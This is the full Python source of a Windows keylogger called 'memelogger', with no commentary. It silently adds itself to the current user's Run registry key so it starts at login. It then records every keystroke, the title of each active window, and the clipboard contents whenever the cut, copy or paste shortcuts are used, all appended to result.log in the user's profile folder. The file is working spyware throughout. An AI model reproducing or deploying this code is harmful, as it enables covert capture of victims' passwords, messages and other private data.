import os
import winreg
import sys
import unicodedata
from datetime import datetime
import keyboard
import pyperclip
import win32gui
from pynput import keyboard as kb
from pynput.keyboard import Key

current_window = None

special_keys = {
    Key.alt_l: "",
    Key.alt_r: "",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: "",
    Key.cmd_l: " [Windows Key] ",
    Key.ctrl_l: "",
    Key.ctrl_r: "",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: "",
    Key.enter: "\n",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f12: " [F12] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.home: "",
    Key.insert: "",
    Key.left: " [Left] ",
    Key.num_lock: "",
    Key.page_down: "",
    Key.page_up: "",
    Key.pause: "",
    Key.right: " [Right] ",
    Key.scroll_lock: "",
    Key.shift_l: "",
    Key.shift_r: "",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.media_volume_up: " [Volume Up] ",
    Key.media_volume_down: " [Volume Down] ",
    Key.media_volume_mute: " [Mute] ",
    Key.media_next: " [Next Track] ",
    Key.media_previous: " [Previous Track] ",
    Key.media_play_pause: " [Play/Pause] ",
}


def add_to_registry():
    exe_path = os.path.abspath(sys.executable)
    key_name = "memelogger"
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS
        ) as reg_key:
            try:
                existing_value, _ = winreg.QueryValueEx(reg_key, key_name)
                if existing_value == exe_path:
                    return
            except FileNotFoundError:
                pass
            winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)
    except Exception:
        return


def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown Window"


def log_window_change():
    global current_window
    new_window = get_active_window()
    if new_window != current_window and new_window.strip():
        current_window = new_window
        path = os.path.join(os.getenv("USERPROFILE"), "result.log")
        with open(path, "a", encoding="utf-8") as file:
            file.write(
                "\n" + ("=" * 50) + "\n" + "[Active Window]: " + current_window + "\n"
            )


def on_press(key):
    log_window_change()
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding="utf-8") as file:
        try:
            if key in special_keys:
                file.write(special_keys[key])
            elif key is None:
                file.write("\n" + "[Error]: Key press event was None" + "\n")
            else:
                char = key.char
                try:
                    unicodedata.name(char)
                    file.write(unicodedata.normalize("NFC", char))
                except (ValueError, AttributeError):
                    file.write("\n" + "[Unknown Key]: " f'"{str(key)}"' + "\n")
        except AttributeError:
            file.write(str(key))


def copy_clipboard_data():
    log_window_change()
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding="utf-8") as file:
        clipboard_data = pyperclip.paste()
        if clipboard_data:
            file.write("\n[Clipboard data]: {\n" + clipboard_data + " \n}\n")
        else:
            file.write("\n" + "[Warning]: Clipboard data is empty" + "\n")


def write_date_to_file():
    path = os.path.join(os.getenv("USERPROFILE"), "result.log")
    with open(path, "a", encoding="utf-8") as file:
        current_date = datetime.now().strftime("%m/%d/%Y %H:%M")
        file.write(
            "\n" + ("# " * 25) + "\n[Date]: " + current_date + "\n" + ("# " * 25) + "\n"
        )


if __name__ == "__main__":
    add_to_registry()
    write_date_to_file()
    keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)
    keyboard.add_hotkey("ctrl+c", copy_clipboard_data, suppress=False)
    keyboard.add_hotkey("ctrl+x", copy_clipboard_data, suppress=False)
    with kb.Listener(on_press=on_press) as listener:
        listener.join()
